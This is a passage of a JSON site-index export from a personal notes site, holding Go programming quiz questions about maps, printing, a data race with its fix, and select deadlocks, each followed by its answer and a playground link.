style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eStudent\u003c/span\u003e{\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Aceld\u0026#34;\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elist\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;student\u0026#34;\u003c/span\u003e] = \u003cspan style=\"color:#a6e22e\"\u003estudent\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elist\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;student\u0026#34;\u003c/span\u003e].\u003cspan style=\"color:#a6e22e\"\u003eName\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;LDB\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003elist\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;student\u0026#34;\u003c/span\u003e])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/gkPDhQyDAQW\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003ecompilation error\ncannot assign to struct field list[\"student\"].Name in map\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003emap1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003em\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e make(\u003cspan style=\"color:#66d9ef\"\u003emap\u003c/span\u003e[\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e]\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e len(\u003cspan style=\"color:#a6e22e\"\u003em\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003em\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e] = \u003cspan style=\"color:#a6e22e\"\u003em\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e len(\u003cspan style=\"color:#a6e22e\"\u003em\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tprintln(\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/OM5SjB_pob2\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e0 1\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Map"},{"categories":null,"contents":" print package main import \u0026#34;fmt\u0026#34; type T struct { x int } func (t T) String() string { return \u0026#34;boo\u0026#34; } func main() { t := T{123} fmt.Printf(\u0026#34;%v\\n\u0026#34;, t) fmt.Printf(\u0026#34;%#v\\n\u0026#34;, t) } Answer Try it boo main.T{x:123} print1 package main import ( \u0026#34;fmt\u0026#34; ) func f(a ...int) { fmt.Printf(\u0026#34;%#v\\n\u0026#34;, a) } func main() { f() } Answer Try it []int(nil) ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/go/questions/print/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eprint\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eT\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eString\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e { \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;boo\u0026#34;\u003c/span\u003e }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eT\u003c/span\u003e{\u003cspan style=\"color:#ae81ff\"\u003e123\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%v\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%#v\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/hwt8G32Bfy5\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003eboo\nmain.T{x:123}\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eprint1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e...\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%#v\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/uCBzdeAxFE6\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e[]int(nil)\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Print"},{"categories":null,"contents":" race type Stats struct { mutex sync.Mutex counters map[string]int } func (s *Stats) Snapshot() map[string]int { s.mutex.Lock() defer s.mutex.Unlock() return s.counters } func (s *Stats) Add(name string, num int) { s.mutex.Lock() defer s.mutex.Unlock() s.counters[name] = num } Answer func (s *Stats) Snapshot() map[string]int { s.mutex.Lock() defer s.mutex.Unlock() result := make(map[string]int, len(s.counters)) for k, v := range s.counters { result[k] = v } return result } ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/go/questions/race/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003erace\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eStats\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003emutex\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esync\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eMutex\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003ecounters\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003emap\u003c/span\u003e[\u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e]\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eStats\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eSnapshot\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003emap\u003c/span\u003e[\u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e]\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003emutex\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eLock\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003emutex\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eUnlock\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ecounters\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eStats\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eAdd\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ename\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003enum\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003emutex\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eLock\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003emutex\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eUnlock\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ecounters\u003c/span\u003e[\u003cspan style=\"color:#a6e22e\"\u003ename\u003c/span\u003e] = \u003cspan style=\"color:#a6e22e\"\u003enum\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\n\u003ccode class=\"language-golang\"\u003efunc (s *Stats) Snapshot() map[string]int {\n\ts.mutex.Lock()\n\tdefer s.mutex.Unlock()\n\tresult := make(map[string]int, len(s.counters))\n\tfor k, v := range s.counters {\n\t\tresult[k] = v\n\t}\n\treturn result\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Race"},{"categories":null,"contents":" select package main import \u0026#34;sync\u0026#34; func main() { var wg sync.WaitGroup foo := make(chan int) bar := make(chan int) wg.Add(1) go func() { defer wg.Done() select { case foo \u0026lt;- \u0026lt;-bar: default: println(\u0026#34;default\u0026#34;) } }() wg.Wait() } Answer Try it fatal error: all goroutines are asleep - deadlock! select1 package main import \u0026#34;fmt\u0026#34; func main() { ch1 := make(chan int) ch2 := make(chan int) go func() { ch1 \u0026lt;- 1 }() go func() { select { case \u0026lt;-ch1: case ch2 \u0026lt;- 2: } }() fmt.Println(\u0026lt;-ch2) } A. 1 B. 2 C. No output, program is deadlocked D. No output, program has finished execution. E. else Answer Try it B ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/go/questions/select/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eselect\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;sync\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ewg\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esync\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWaitGroup\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efoo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e make(\u003cspan style=\"color:#66d9ef\"\u003echan\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ebar\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e make(\u003cspan style=\"color:#66d9ef\"\u003echan\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ewg\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eAdd\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ego\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ewg\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eDone\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003eselect\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ecase\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efoo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ebar\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003edefault\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\tprintln(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;default\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ewg\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWait\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/kF4pOjYXbXf\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003efatal error: all goroutines are asleep - deadlock!\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eselect1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 